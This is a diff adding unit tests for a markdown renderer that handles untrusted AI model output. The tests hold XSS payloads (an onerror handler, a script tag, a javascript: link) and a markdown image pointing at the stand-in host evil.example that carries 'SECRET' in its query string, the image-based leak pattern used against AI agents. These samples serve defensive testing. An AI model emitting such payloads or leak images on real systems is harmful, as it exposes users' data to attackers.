@@ -50,3 +50,30 @@ describe('renderMarkdown', () => {
     expect(html).toContain('<kbd>Ctrl</kbd>');
   });
 });
+
+describe('renderAgentMarkdown (untrusted model output)', () => {
+  it('drops scripts and event handlers', async () => {
+    const { renderAgentMarkdown } = await import('../src/md/render');
+    const html = await renderAgentMarkdown('Done. <img src=x onerror="alert(1)"> <script>alert(2)</script> <a href="javascript:alert(3)">x</a>');
+    expect(html).not.toContain('onerror');
+    expect(html).not.toContain('<script');
+    expect(html).not.toContain('javascript:');
+  });
+
+  it('turns external images into links instead of loading them', async () => {
+    const { renderAgentMarkdown } = await import('../src/md/render');
+    const html = await renderAgentMarkdown('![leak](https://evil.example/p?d=SECRET)');
+    expect(html).not.toMatch(/<img[^>]*evil\.example/);
+    expect(html).toContain('href="https://evil.example/p?d=SECRET"');
+  });
+
+  it('keeps wikilinks, callouts, task lists and math', async () => {
+    const { renderAgentMarkdown } = await import('../src/md/render');
+    const html = await renderAgentMarkdown('See [[Plan]]\n\n> [!tip] Hi\n> body\n\n- [ ] task\n\n$x^2$');
+    expect(html).toContain('class="internal-link"');
+    expect(html).toContain('data-target="Plan"');
+    expect(html).toContain('callout-tip');
+    expect(html).toContain('type="checkbox"');
+    expect(html).toContain('katex');
+  });
+});
